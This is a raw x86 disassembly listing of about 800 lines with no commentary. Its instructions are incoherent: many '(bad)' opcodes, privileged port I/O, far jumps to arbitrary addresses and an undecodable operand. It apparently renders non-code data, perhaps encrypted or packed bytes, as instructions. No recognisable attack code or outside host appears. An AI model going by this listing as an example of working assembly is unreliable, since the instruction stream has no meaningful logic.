  411919:	rol    DWORD PTR [edi+0x75ee89a3],1
  41191f:	js     0x4118d6
  411921:	cs pusha 
  411923:	gs mov edi,0x37288271
  411929:	out    dx,al
  41192a:	out    0xd7,al
  41192c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41192d:	icebp  
  41192e:	cli    
  41192f:	imul   ebx,DWORD PTR [ecx-0x7a59f248],0xfffffff0
  411936:	nop
  411937:	xchg   esp,eax
  411938:	inc    ebx
  411939:	cs or  eax,0x199cf53d
  41193f:	push   ecx
  411940:	pop    esp
  411941:	pop    ds
  411942:	xchg   DWORD PTR [ebp-0x6],ecx
  411945:	leave  
  411946:	and    dl,ch
  411948:	sbb    eax,0x9d297d35
  41194d:	push   ss
  41194e:	xchg   ebp,eax
  41194f:	jg     0x411948
  411951:	dec    edi
  411952:	mov    ecx,0x5ea3f877
  411957:	leave  
  411958:	adc    edi,edx
  41195a:	sbb    BYTE PTR [esi],cl
  41195c:	jmp    0xa3f7:0x72db333a
  411963:	and    edi,esi
  411965:	or     esp,esp
  411967:	sbb    DWORD PTR [eax+0x591956a9],esi
  41196d:	sti    
  41196e:	push   eax
  41196f:	test   BYTE PTR [esi+0x1fab6a5e],0x71
  411976:	(bad)  
  411977:	adc    esp,DWORD PTR [eax]
  411979:	in     eax,0x3c
  41197b:	mov    dl,0xb
  41197d:	xor    al,bl
  41197f:	lds    ecx,FWORD PTR [ebx+0x49]
  411982:	js     0x4119e4
  411984:	jmp    0x411942
  411986:	bound  edx,QWORD PTR [eax-0x3dd10f90]
  41198c:	stos   DWORD PTR es:[edi],eax
  41198d:	out    dx,eax
  41198e:	mov    DWORD PTR [ecx+0x51],esi
  411991:	push   ebp
  411992:	or     BYTE PTR [ebx-0x7864efcf],ch
  411998:	es (bad) 
  41199a:	lock imul ebx,DWORD PTR [edi],0xcdaf0607
  4119a1:	ja     0x411951
  4119a3:	sub    BYTE PTR [esi-0x6b],al
  4119a6:	mov    bl,0xde
  4119a8:	cld    
  4119a9:	and    DWORD PTR ds:0x86e6bc65,ebx
  4119af:	and    eax,0xadc06763
  4119b4:	pusha  
  4119b5:	adc    al,0x97
  4119b7:	retf   
  4119b8:	mov    bl,0x16
  4119ba:	push   cs
  4119bb:	push   ss
  4119bc:	mov    ds:0xfca8c527,eax
  4119c1:	leave  
  4119c2:	int3   
  4119c3:	cmp    eax,0x798788b7
  4119c8:	cmp    BYTE PTR [eax-0x6bc580b],dl
  4119ce:	adc    DWORD PTR ds:0x2aa9d136,0x70
  4119d5:	inc    eax
  4119d6:	arpl   WORD PTR [ebx+0x4adc33f7],dx
  4119dc:	scas   al,BYTE PTR es:[edi]
  4119dd:	pop    esi
  4119de:	and    bl,BYTE PTR [edx]
  4119e0:	sub    eax,0xc011a2f1
  4119e5:	mov    ebx,0x262362b2
  4119ea:	adc    ch,BYTE PTR [si]
  4119ed:	retf   
  4119ee:	xchg   DWORD PTR [ebx+0xa482764],ecx
  4119f4:	addr16 lock out 0xd9,al
  4119f8:	jb     0x4119c9
  4119fa:	(bad)  
  4119fb:	fidiv  WORD PTR [edi-0x3c5d48ce]
  411a01:	(bad)  
  411a02:	jo     0x4119bc
  411a04:	push   cs
  411a05:	sub    cl,dl
  411a07:	cmc    
  411a08:	(bad)  
  411a09:	xchg   ebx,eax
  411a0a:	xchg   DWORD PTR [edi+0x45],ebx
  411a0d:	icebp  
  411a0e:	loopne 0x411a82
  411a10:	pop    eax
  411a11:	shl    DWORD PTR [ebx+ebp*4],0xc7
  411a15:	mov    ds:0x10608875,al
  411a1a:	xchg   ebx,esi
  411a1c:	and    esi,esp
  411a1e:	ds (bad) 
  411a20:	shl    DWORD PTR [edi-0x16ebd621],1
  411a26:	mov    cl,bl
  411a28:	or     BYTE PTR [esi],ah
  411a2a:	inc    eax
  411a2b:	test   bh,ch
  411a2d:	repz mov eax,ds:0x71901db
  411a33:	mov    ah,0x55
  411a35:	lds    edx,FWORD PTR [ebx]
  411a37:	sub    DWORD PTR [ecx+edi*1],eax
  411a3a:	in     eax,dx
  411a3b:	stos   BYTE PTR es:[edi],al
  411a3c:	imul   DWORD PTR [ebp-0x6ab993f0]
  411a42:	adc    bl,al
  411a44:	fdivr  st(0),st
  411a46:	dec    eax
  411a47:	or     DWORD PTR [edx],edx
  411a49:	jno    0x411a63
  411a4b:	sti    
  411a4c:	ja     0x411a3b
  411a4e:	outs   dx,BYTE PTR ds:[esi]
  411a4f:	xchg   ecx,eax
  411a50:	rol    DWORD PTR [ebx+0x78df2f87],1
  411a56:	or     ah,dl
  411a58:	adc    eax,0x652b33f3
  411a5d:	xchg   edx,ebp
  411a5f:	shr    DWORD PTR [edi],1
  411a61:	push   0xffffffa6
  411a63:	mov    al,ds:0xa3876f7e
  411a68:	call   0xd00494df
  411a6d:	inc    ecx
  411a6e:	out    0x2b,eax
  411a70:	or     DWORD PTR ds:0x4b2161c8,edi
  411a76:	test   cl,dl
  411a78:	or     esp,esi
  411a7a:	ss (bad) 
  411a7d:	add    esp,DWORD PTR [ecx]
  411a7f:	sti    
  411a80:	mov    ebx,0xc5e9958f
  411a85:	or     cl,BYTE PTR [ecx]
  411a87:	sub    edx,ebx
  411a89:	out    dx,eax
  411a8a:	(bad)  
  411a8b:	ror    DWORD PTR [eax],1
  411a8d:	mov    ds:0xfdc8b23,al
  411a92:	mov    dh,0xee
  411a94:	ins    BYTE PTR es:[edi],dx
  411a95:	lock cwde 
  411a97:	cmc    
  411a98:	push   eax
  411a99:	test   eax,0xa12bbd42
  411a9e:	nop
  411a9f:	xchg   DWORD PTR [esi-0x13],ebp
  411aa2:	xchg   BYTE PTR [ebx-0x57],dl
  411aa5:	xchg   DWORD PTR [esi],edi
  411aa7:	clc    
  411aa8:	in     eax,0x7d
  411aaa:	mov    al,ds:0xc03e9c29
  411aaf:	hlt    
  411ab0:	or     ah,dl
  411ab2:	hlt    
  411ab3:	sub    DWORD PTR [ebp-0x5b],0xf0d6463a
  411aba:	sbb    al,0x8b
  411abc:	std    
  411abd:	test   BYTE PTR [ecx],bl
  411abf:	jecxz  0x411a99
  411ac1:	lds    esp,FWORD PTR [edi-0x778f929e]
  411ac7:	mov    cl,0x9
  411ac9:	ds (bad) 
  411acb:	in     al,0x68
  411acd:	lock push 0xeeace115
  411ad3:	pop    esi
  411ad4:	xor    eax,0xa26933ae
  411ad9:	sahf   
  411ada:	xchg   edi,ecx
  411adc:	sahf   
  411add:	gs jecxz 0x411b47
  411ae0:	fldcw  WORD PTR [ebp+0x69072823]
  411ae6:	cmp    DWORD PTR [edx+0x27ee5bf7],esi
  411aec:	pop    ecx
  411aed:	or     al,0x4a
  411aef:	sbb    DWORD PTR [ecx-0x6b48d10f],ebp
  411af5:	push   edi
  411af6:	(bad)  
  411af7:	in     al,dx
  411af8:	int    0x5e
  411afa:	cld    
  411afb:	xor    ebp,esp
  411afd:	icebp  
  411afe:	repz arpl WORD PTR [edi+0x27],bx
  411b02:	mov    eax,ds:0x4a1b9898
  411b07:	jno    0x411a96
  411b09:	sub    ch,BYTE PTR [esi+0x29]
  411b0c:	sub    DWORD PTR [ecx],esi
  411b0e:	retf   0x980
  411b11:	fisubr DWORD PTR [edx+0xa73b387]
  411b17:	inc    edx
  411b18:	xchg   BYTE PTR [edi],cl
  411b1a:	pop    esi
  411b1b:	dec    esi
  411b1c:	pop    ecx
  411b1d:	and    bh,BYTE PTR [eax]
  411b1f:	sub    dl,bh
  411b21:	sar    edx,cl
  411b23:	jg     0x411b5b
  411b25:	scas   al,BYTE PTR es:[edi]
  411b26:	int    0xcd
  411b28:	div    DWORD PTR [eax+ebp*2+0x1a17b236]
  411b2f:	inc    ecx
  411b30:	inc    edi
  411b31:	dec    ebp
  411b32:	mov    ebp,0x6aab4e29
  411b37:	test   eax,0xc1f151c1
  411b3c:	push   eax
  411b3d:	xchg   esp,eax
  411b3e:	xchg   BYTE PTR [edi-0x12afa0e4],bh
  411b44:	shr    DWORD PTR [eax+0x42],cl
  411b47:	sub    BYTE PTR [esi-0x6b],dh
  411b4a:	pop    es
  411b4b:	test   DWORD PTR [ecx],0xa1d5830e
  411b51:	lock mov bl,0xa7
  411b54:	pop    ebp
  411b55:	fistp  QWORD PTR [ebp+ebp*2+0x0]
  411b59:	lock mov ah,0x70
  411b5c:	and    esp,eax
  411b5e:	jl     0x411b55
  411b60:	or     BYTE PTR [eax+eax*8+0x14437724],ah
  411b67:	in     eax,dx
  411b68:	jne    0x411b5d
  411b6a:	pusha  
  411b6b:	scas   al,BYTE PTR es:[edi]
  411b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b6d:	and    esi,edi
  411b6f:	push   ebx
  411b70:	sub    eax,0x8b27101
  411b75:	jb     0x411b5a
  411b77:	add    al,BYTE PTR [ebx-0x5e]
  411b7a:	pop    ss
  411b7b:	lods   eax,DWORD PTR ds:[esi]
  411b7c:	and    cl,dh
  411b7e:	push   esi
  411b7f:	fild   DWORD PTR [ebp-0x516def4b]
  411b85:	jns    0x411b2e
  411b87:	cmp    al,0x10
  411b89:	push   es
  411b8a:	xchg   BYTE PTR [edi-0x1c],dh
  411b8d:	push   eax
  411b8e:	xchg   esp,eax
  411b8f:	lea    ecx,[ebp+0x235d8dfe]
  411b95:	ret    
  411b96:	xchg   bh,ah
  411b98:	xor    al,0xe3
  411b9a:	retf   
  411b9b:	mov    ah,BYTE PTR [edx-0x7b]
  411b9e:	xchg   BYTE PTR [ecx],bl
  411ba0:	outs   dx,DWORD PTR ds:[esi]
  411ba1:	push   0x3e
  411ba3:	aad    0x59
  411ba5:	xor    ebp,DWORD PTR ds:[ecx]
  411ba8:	js     0x411bdc
  411baa:	ins    DWORD PTR es:[edi],dx
  411bab:	shl    edi,0x9
  411bae:	std    
  411baf:	and    ah,ch
  411bb1:	or     ecx,edx
  411bb3:	pop    ss
  411bb4:	inc    esp
  411bb5:	adc    dl,BYTE PTR [edx-0x646432da]
  411bbb:	adc    eax,DWORD PTR [ebp+0x10a92901]
  411bc1:	cmp    esi,DWORD PTR [ecx-0x76728592]
  411bc7:	or     eax,0x7e633db7
  411bcc:	fdiv   st,st(0)
  411bce:	mov    bl,BYTE PTR [ecx+0xf994474]
  411bd4:	push   edx
  411bd5:	retf   0x829b
  411bd8:	fwait
  411bd9:	inc    ebx
  411bda:	xchg   BYTE PTR [edi-0x13],ch
  411bdd:	ret    
  411bde:	fs ret 0xec78
  411be2:	add    cl,0xec
  411be5:	inc    edx
  411be6:	stc    
  411be7:	xor    ah,BYTE PTR [esi+0x70]
  411bea:	push   es
  411beb:	or     DWORD PTR [ebx-0x5e],esi
  411bee:	mov    cl,0xa7
  411bf0:	fwait
  411bf1:	cmc    
  411bf2:	aad    0x29
  411bf4:	out    dx,al
  411bf5:	aas    
  411bf6:	rcr    ebx,0xbf
  411bf9:	cmp    esp,DWORD PTR [ebx-0x2d93f7c1]
  411bff:	inc    ebp
  411c00:	mov    al,dl
  411c02:	in     al,0x97
  411c04:	bound  eax,QWORD PTR ds:[edi+0x703cc333]
  411c0b:	mov    ecx,0x17422351
  411c10:	or     al,0x65
  411c12:	push   edx
  411c13:	sub    DWORD PTR [esi+0x5d],edx
  411c16:	push   esi
  411c17:	mov    esi,0x1987a814
  411c1c:	aaa    
  411c1d:	mov    ecx,0x474b57a5
  411c22:	xor    eax,0xd34dce28
  411c27:	loopne 0x411c31
  411c29:	add    bl,BYTE PTR [esi]
  411c2b:	fwait
  411c2c:	push   0x63f61655
  411c31:	icebp  
  411c32:	mov    BYTE PTR [edi],0xf6
  411c35:	pop    es
  411c36:	outs   dx,DWORD PTR ds:[esi]
  411c37:	xchg   ebx,eax
  411c38:	jge    0x411c7f
  411c3a:	xchg   esi,eax
  411c3b:	jecxz  0x411c30
  411c3d:	dec    ebx
  411c3e:	test   ebx,edi
  411c40:	js     0x411c1e
  411c42:	sub    cl,cl
  411c44:	into   
  411c45:	lock jle 0x411be6
  411c48:	std    
  411c49:	rcl    DWORD PTR [esi],1
  411c4b:	mov    ah,BYTE PTR [ebx-0x52]
  411c4e:	inc    esi
  411c4f:	in     eax,0x74
  411c51:	gs mov esi,0x1b3f8a01
  411c57:	dec    ebp
  411c58:	idiv   esi
  411c5a:	test   al,0x4a
  411c5c:	push   es
  411c5d:	icebp  
  411c5e:	or     BYTE PTR [ebp-0x58],dh
  411c61:	fcmovb st,st(5)
  411c63:	xlat   BYTE PTR ds:[ebx]
  411c64:	lock add esp,ebx
  411c67:	mov    esi,0x7b88c891
  411c6c:	test   al,0xcc
  411c6e:	les    edi,FWORD PTR cs:[ebx]
  411c71:	pop    ss
  411c72:	out    dx,al
  411c73:	or     eax,0x2829d853
  411c78:	loopne 0x411c52
  411c7a:	les    esp,FWORD PTR [eax-0x59ce8ff8]
  411c80:	mov    es,WORD PTR [ecx+0x2a]
  411c83:	add    BYTE PTR [ebp-0xf],0x80
  411c87:	dec    edi
  411c88:	mov    dh,ah
  411c8a:	arpl   WORD PTR [ecx+0x79030301],di
  411c90:	push   es
  411c91:	mov    esp,0xcf62f6b7
  411c96:	les    ebp,FWORD PTR [ecx-0x18]
  411c99:	xchg   cl,cl
  411c9b:	jne    0x411c93
  411c9d:	icebp  
  411c9e:	push   cs
  411c9f:	sub    dl,BYTE PTR [eax+0x30]
  411ca2:	mov    DWORD PTR [edi],edx
  411ca4:	xchg   BYTE PTR [edx-0x35e39d84],cl
  411caa:	mov    esp,0x6f6a1d9
  411caf:	or     cl,bl
  411cb1:	icebp  
  411cb2:	(bad)  
  411cb4:	add    eax,0xa01fa94e
  411cb9:	mov    ecx,0xc4bd49d5
  411cbe:	xor    DWORD PTR [ebx+0x15afa0f0],0xeb0cc847
  411cc8:	hlt    
  411cc9:	lock xchg edx,eax
  411ccb:	push   es
  411ccc:	pop    esp
  411ccd:	adc    al,0x2a
  411ccf:	push   ss
  411cd0:	hlt    
  411cd1:	out    dx,eax
  411cd2:	ja     0x411c66
  411cd4:	cmp    al,0xb
  411cd6:	or     BYTE PTR [ebx],0x8f
  411cd9:	into   
  411cda:	sbb    esp,esi
  411cdc:	lods   al,BYTE PTR ds:[esi]
  411cdd:	xchg   ecx,eax
  411cde:	(bad)  
  411cdf:	out    0x41,eax
  411ce1:	fwait
  411ce2:	jnp    0x411d0e
  411ce4:	mov    dl,0xc9
  411ce6:	ja     0x411d56
  411ce8:	ret    
  411ce9:	loope  0x411d41
  411ceb:	mov    DWORD PTR [eax],eax
  411ced:	mov    WORD PTR [ebx],ax
  411cf0:	xlat   BYTE PTR ds:[ebx]
  411cf1:	or     esi,DWORD PTR [ecx+0x34f00405]
  411cf7:	into   
  411cf8:	mov    ds:0x36772733,eax
  411cfd:	jmp    0x411cee
  411cff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d00:	or     DWORD PTR [eax],ebx
  411d02:	jns    0x411cf3
  411d04:	aam    0xb9
  411d06:	clc    
  411d07:	call   0x740b1e90
  411d0c:	dec    ebx
  411d0d:	(bad)  
  411d0e:	sub    ebp,DWORD PTR [ecx]
  411d10:	xor    BYTE PTR [ebx-0x18],dh
  411d13:	sahf   
  411d14:	or     BYTE PTR [esi-0x2174c86f],ch
  411d1a:	out    dx,eax
  411d1b:	xor    bh,BYTE PTR [edx-0x10]
  411d1e:	push   eax
  411d1f:	dec    edi
  411d20:	pop    ds
  411d21:	jnp    0x411d4c
  411d23:	les    edx,FWORD PTR [edi+esi*2+0x2d]
  411d27:	cmp    al,0xd0
  411d2a:	xchg   BYTE PTR [ebx-0x43],bh
  411d2d:	pop    ds
  411d2e:	jecxz  0x411d60
  411d30:	xchg   edi,eax
  411d31:	jno    0x411dab
  411d33:	sub    ebx,esp
  411d35:	ficomp DWORD PTR [edx-0x59]
  411d38:	or     dh,dh
  411d3a:	arpl   WORD PTR [esi+edi*4-0x29a1c25e],di
  411d41:	lock cmp al,0x85
  411d44:	aaa    
  411d45:	cmp    dl,BYTE PTR [ebx+0x51]
  411d48:	jmp    0x411cf9
  411d4a:	ror    DWORD PTR [esp+esi*8-0x10],0xf9
  411d4f:	(bad)  
  411d50:	stc    
  411d51:	ficom  WORD PTR [edx-0x1a]
  411d54:	add    cl,dh
  411d56:	test   BYTE PTR [edx-0x11926927],al
  411d5c:	adc    edi,ebp
  411d5e:	enter  0x2875,0x9a
  411d62:	xchg   ch,ch
  411d64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d65:	fmulp  st(4),st
  411d67:	xor    al,BYTE PTR [eax]
  411d69:	icebp  
  411d6a:	add    ch,0x80
  411d6d:	dec    esp
  411d6e:	fcom   DWORD PTR [ebx]
  411d70:	out    0xa9,eax
  411d72:	adc    DWORD PTR [eax+eiz*2],edi
  411d75:	bnd call DWORD PTR [ecx-0x5b02a82c]
  411d7c:	mov    al,0xe9
  411d7e:	inc    edi
  411d7f:	xor    esp,DWORD PTR [ebx-0x74d734c3]
  411d85:	mov    eax,0xcc0a713c
  411d8a:	rcl    BYTE PTR [ecx],cl
  411d8c:	ins    BYTE PTR es:[edi],dx
  411d8d:	out    dx,al
  411d8e:	les    edi,FWORD PTR [edi]
  411d90:	mov    BYTE PTR [ebp-0x1b],al
  411d93:	push   cs
  411d94:	mov    edi,0x2b05e0c2
  411d99:	jg     0x411dc3
  411d9b:	das    
  411d9c:	pop    eax
  411d9d:	sbb    ebp,edi
  411d9f:	jne    0x411d67
  411da1:	jb     0x411dbd
  411da3:	push   esp
  411da4:	xlat   BYTE PTR ds:[ebx]
  411da5:	jmp    0x823f9254
  411daa:	push   ss
  411dab:	inc    eax
  411dac:	std    
  411dad:	lock jmp 0xb378:0xc7b8d756
  411db5:	shr    bh,cl
  411db7:	mov    cl,0x30
  411db9:	dec    esp
  411dba:	xchg   DWORD PTR ds:0xaf2b1b08,eax
  411dc0:	push   edi
  411dc1:	or     esi,DWORD PTR [eax+0x28]
  411dc4:	pusha  
  411dc5:	sbb    bl,dh
  411dc7:	or     WORD PTR [esi],sp
  411dca:	cld    
  411dcb:	mov    ch,0x3
  411dcd:	hlt    
  411dce:	sar    BYTE PTR [edx+eax*8-0x1],cl
  411dd2:	inc    esp
  411dd3:	test   BYTE PTR [edx+ecx*2-0x2],bh
  411dd7:	adc    DWORD PTR [eax+edi*1],edi
  411dda:	in     eax,0x49
  411ddc:	or     eax,esp
  411dde:	mov    ch,0xa3
  411de0:	scas   eax,DWORD PTR es:[edi]
  411de1:	lods   eax,DWORD PTR ds:[esi]
  411de2:	daa    
  411de3:	add    BYTE PTR ds:0xfbec6a19,0xdd
  411dea:	sub    BYTE PTR ds:[edi-0x8967df1],dh
  411df1:	jge    0x411e0f
  411df3:	cmp    eax,0xa756fd8b
  411df8:	push   cs
  411df9:	sub    DWORD PTR [edx],0xffffffe1
  411dfc:	or     BYTE PTR [eax-0x68],dh
  411dff:	pop    ss
  411e00:	cmc    
  411e01:	(bad)  
  411e02:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e03:	xor    ecx,DWORD PTR [eax]
  411e05:	or     ch,dh
  411e07:	(bad)  
  411e08:	and    eax,0x8acbc3c4
  411e0d:	into   
  411e0e:	pop    eax
  411e0f:	je     0x411ddc
  411e11:	icebp  
  411e12:	push   ss
  411e13:	dec    edi
  411e14:	pushf  
  411e15:	sti    
  411e16:	cmp    ah,bh
  411e18:	out    0xe0,al
  411e1a:	mov    eax,0x4c6a54ce
  411e1f:	sbb    ebx,DWORD PTR [eax+0x5740759]
  411e25:	inc    edx
  411e26:	inc    edx
  411e27:	sub    DWORD PTR [ebp+0x8a5292a],edi
  411e2d:	es loop 0x411dd6
  411e30:	and    al,0x8f
  411e32:	cdq    
  411e33:	mov    edi,0xa504f018
  411e38:	(bad)  
  411e39:	pop    eax
  411e3a:	or     eax,0xf9f5864b
  411e3f:	sub    DWORD PTR [ecx-0x7c],ebx
  411e42:	test   DWORD PTR [ebp-0x65],ecx
  411e45:	adc    edx,ebp
  411e47:	ret    
  411e48:	pop    ebp
  411e49:	icebp  
  411e4a:	push   ds
  411e4b:	sar    dh,1
  411e4d:	in     eax,dx
  411e4e:	fimul  DWORD PTR [edx+0xd]
  411e51:	in     eax,0xc9
  411e53:	out    0x46,eax
  411e55:	rol    DWORD PTR [edi-0x6cf6f7e3],cl
  411e5b:	sub    ebx,ecx
  411e5d:	icebp  
  411e5e:	or     bl,cl
  411e60:	mov    bh,0xe9
  411e62:	mov    esp,0x1b13a211
  411e67:	pushf  
  411e68:	or     esi,ecx
  411e6a:	imul   esi,ecx,0x70
  411e6d:	sbb    eax,0xf06995ff
  411e72:	ins    BYTE PTR es:[edi],dx
  411e73:	cmp    al,BYTE PTR [ebp-0x45]
  411e76:	cmc    
  411e77:	push   edi
  411e78:	xchg   edx,eax
  411e79:	ret    
  411e7a:	adc    esp,ebp
  411e7c:	loopne 0x411e85
  411e7e:	xchg   BYTE PTR [ebx],bh
  411e80:	fadd   DWORD PTR [esi+esi*4]
  411e83:	mov    BYTE PTR [ecx],cl
  411e85:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  411e87:	es stos DWORD PTR es:[edi],eax
  411e89:	jo     0x411e47
  411e8b:	fxch   st(7)
  411e8d:	adc    eax,0x1dbfdacb
  411e92:	xchg   BYTE PTR ds:0x9fdeb08d,bl
  411e98:	cdq    
  411e99:	push   ds
  411e9a:	sbb    al,0x29
  411e9c:	icebp  
  411e9d:	mov    ecx,0xea95f6b9
  411ea2:	sbb    ch,ah
  411ea4:	push   ds
  411ea5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ea6:	pop    es
  411ea7:	scas   al,BYTE PTR es:[edi]
  411ea8:	into   
  411ea9:	repz je 0x411e7f
  411eac:	ret    0x18b9
  411eaf:	(bad)  
  411eb0:	mov    ds:0x6171f69,eax
  411eb5:	push   eax
  411eb6:	xchg   ecx,eax
  411eb7:	push   ss
  411eb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411eb9:	(bad)  
  411eba:	mov    bh,0x7d
  411ebc:	cmp    DWORD PTR [ebp+0x66],edx
  411ebf:	es jmp 0x411ec8
  411ec2:	cwde   
  411ec3:	sub    DWORD PTR [ebx],esp
  411ec5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ec6:	dec    edx
  411ec7:	jb     0x411ecf
  411ec9:	pop    esp
  411eca:	int3   
  411ecb:	xchg   bh,ch
  411ecd:	ficomp WORD PTR [eax-0x5e]
  411ed0:	sub    DWORD PTR [edx+0x1e19786],esi
  411ed6:	sub    DWORD PTR [eax],ebp
  411ed8:	jnp    0x411f1c
  411eda:	sub    DWORD PTR [edx+0x6051d41a],0x5ee2f081
  411ee4:	fidivr WORD PTR [edx+0x17]
  411ee7:	dec    edi
  411ee8:	call   DWORD PTR [edx+0x41]
  411eeb:	push   esi
  411eec:	xchg   edx,eax
  411eed:	dec    edx
  411eee:	xchg   DWORD PTR [ebx],edx
  411ef0:	imul   cx,WORD PTR [eax-0x794d94e6],0xd32b
  411ef9:	clc    
  411efa:	add    esi,DWORD PTR [ecx+0x294ad7d5]
  411f00:	pop    es
  411f01:	test   DWORD PTR [esi-0x6f8df766],0xc30f2cea
  411f0b:	pop    ebx
  411f0c:	mov    BYTE PTR [ecx+0x643be1e9],0x30
  411f13:	sub    al,bh
  411f15:	mov    eax,0x3e07f20
  411f1a:	push   cs
  411f1b:	(bad)  
  411f1c:	mov    dh,cl
  411f1e:	std    
  411f1f:	or     eax,DWORD PTR ds:0xf75eda3e
  411f25:	lock stos BYTE PTR es:[edi],al
  411f27:	imul   eax,DWORD PTR [eax+0x6],0x8c5c003c
  411f2e:	lahf   
  411f2f:	repz sbb al,0x48
  411f32:	xchg   BYTE PTR [edi+0xa],al
  411f35:	mov    al,0x7
  411f37:	cwde   
  411f38:	or     eax,0x16f176f7
  411f3d:	dec    edi
  411f3e:	mov    edi,0x62b529b8
  411f43:	call   0xce9b:0xdecdf008
  411f4a:	xor    al,0x55
  411f4c:	mov    cl,0xf1
  411f4e:	dec    esp
  411f4f:	cld    
  411f50:	sahf   
  411f51:	push   edx
  411f52:	pop    esi
  411f53:	pop    ebp
  411f54:	mov    ?,WORD PTR [ebx+0x35]
  411f57:	aam    0xec
  411f59:	sbb    BYTE PTR [ecx+0x1d512f01],al
  411f5f:	out    dx,al
  411f60:	push   edx
  411f61:	lock inc eax
  411f63:	lods   eax,DWORD PTR ds:[esi]
  411f64:	push   0x7
  411f66:	mov    dl,0x5a
  411f68:	sbb    al,0xce
  411f6a:	lods   al,BYTE PTR ds:[esi]
  411f6b:	sbb    DWORD PTR [ebx],edx
  411f6d:	pusha  
  411f6e:	xchg   edi,ecx
  411f70:	jne    0x411f2c
  411f72:	mov    esp,0x68b85fba
  411f77:	sub    DWORD PTR ds:0x9b525f8,edx
  411f7d:	xchg   edx,eax
  411f7e:	imul   esp,DWORD PTR [edx-0x4cc05f9c],0xffffffd5
  411f85:	lock fsub DWORD PTR [esi+0x44764dba]
  411f8c:	ror    BYTE PTR [edx+0x31],cl
  411f8f:	ror    BYTE PTR [ebx-0x75],cl
  411f92:	std    
  411f93:	jae    0x411fc9
  411f95:	repnz mov ebp,DWORD PTR [ecx]
  411f98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f99:	pop    ss
  411f9a:	das    
  411f9b:	jp     0x411faa
  411f9d:	icebp  
  411f9e:	retf   0xbbd5
  411fa1:	jnp    0x411ff5
  411fa3:	sti    
  411fa4:	mov    eax,0x8c092acf
  411fa9:	xchg   esi,eax
  411faa:	xchg   edi,edi
  411fac:	call   0x50ff:0x2fe8fa16
  411fb3:	ss enter 0x5388,0xe1
  411fb8:	xor    eax,0xb7f331de
  411fbd:	ja     0x411f50
  411fbf:	pop    ebp
  411fc0:	ret    
  411fc1:	dec    DWORD PTR [ebx-0x1312e8d7]
  411fc7:	sbb    ebx,esp
  411fc9:	pop    ss
  411fca:	jno    0x411f7a
  411fcc:	or     eax,0x314e465d
  411fd1:	jp     0x411fa4
  411fd3:	jnp    0x411fdd
  411fd5:	call   0xd81f:0x86e09479
  411fdc:	cmp    esp,0xffffffc0
  411fdf:	sub    DWORD PTR [edx-0x62],esi
  411fe2:	mov    ds:0xd8f21460,al
  411fe7:	add    al,BYTE PTR [edi-0x775228d0]
  411fed:	inc    esp
  411fee:	jmp    0x78b4677d
  411ff3:	sub    BYTE PTR [esi+0x8124fa8],ch
  411ff9:	jp     0x411fce
  411ffb:	or     al,0xa2
  411ffd:	or     al,ah
  411fff:	xor    DWORD PTR [ecx],esi
  412001:	lock fcomp DWORD PTR [eax]
  412004:	test   eax,0xc40e5cc7
  412009:	sub    ecx,DWORD PTR [edx-0x79acbfd7]
  41200f:	ror    DWORD PTR [ebp-0x53],1
  412012:	lea    ebx,[ecx+0x3fe798ab]
  412018:	sbb    DWORD PTR [edi+0x50c10a5d],esp
  41201e:	xchg   BYTE PTR [esi+0x32],dh
  412021:	push   ss
  412022:	or     eax,0xe73c066a
  412027:	mov    esp,0xa9f44d08
  41202c:	sbb    esi,eax
  41202e:	in     al,0x81
  412030:	mov    ebx,DWORD PTR [edi+0x4f]
  412033:	retf   0x52b
  412036:	sahf   
  412037:	jmp    0x31cb023e
  41203c:	sub    dl,al
  41203e:	push   0x1eed768e
  412043:	and    eax,0xaa62c559
  412048:	or     DWORD PTR [ecx],esp
  41204a:	aam    0xc9
  41204c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41204d:	outs   dx,BYTE PTR ds:[esi]
  41204e:	mov    cl,0x86
  412050:	inc    esi
  412051:	int3   
  412052:	mov    esi,0x399d0973
  412057:	jecxz  0x412043
  412059:	into   
  41205a:	push   cs
  41205b:	xchg   ebx,eax
  41205c:	fistp  QWORD PTR [ebp+0x62af2f1f]
  412062:	add    DWORD PTR [ebx],ecx
  412064:	enter  0x41dd,0x88
  412068:	or     esp,eax
  41206a:	and    eax,0xa1843ac
  41206f:	repz sti 
  412071:	hlt    
  412072:	xchg   esi,eax
  412073:	jbe    0x41202d
  412075:	nop
  412076:	mov    ds:0x1bacc897,eax
  41207b:	popa   
  41207c:	xor    al,0xc6
  41207e:	aam    0x1b
  412080:	jle    0x412078
  412082:	loopne 0x41209a
  412084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412085:	cmp    DWORD PTR [eax+0x7c451aab],edx
  41208b:	sub    DWORD PTR [ebx-0x10],edx
  41208e:	or     cl,al
  412090:	add    bh,BYTE PTR [edx+0x7b]
  412093:	ins    DWORD PTR es:[edi],dx
  412094:	jecxz  0x412093
  412096:	scas   eax,DWORD PTR es:[edi]
  412097:	arpl   WORD PTR [esi-0x7a],bx
  41209a:	mov    ecx,0x135d4249
  41209f:	mov    ss,ecx
  4120a1:	mov    ebp,0xf5229588
  4120a6:	xchg   edi,ebp
  4120a8:	sub    edx,edx
  4120aa:	imul   ebp,DWORD PTR [eax],0x442ad91
  4120b0:	push   ss
  4120b1:	enter  0x2ac2,0xb7
  4120b5:	(bad)  
  4120b6:	(bad)  
  4120b8:	test   DWORD PTR fs:[edi-0x1f0f1b64],0x1d31cb22
  4120c3:	leave  
  4120c4:	cmp    al,0xa4
  4120c6:	fild   WORD PTR [eax+ecx*1]
  4120c9:	sub    BYTE PTR [edi+0x5a],bl
  4120cc:	into   
  4120cd:	add    eax,0xf0bebf39
  4120d2:	les    ebx,FWORD PTR [eax+0x160f8b14]
  4120d8:	lds    esp,FWORD PTR [ecx+0x3e14b1eb]
  4120de:	xchg   DWORD PTR [ebp+0x12],esp
  4120e1:	mov    bh,0xe2
  4120e3:	into   
  4120e4:	scas   eax,DWORD PTR es:[edi]
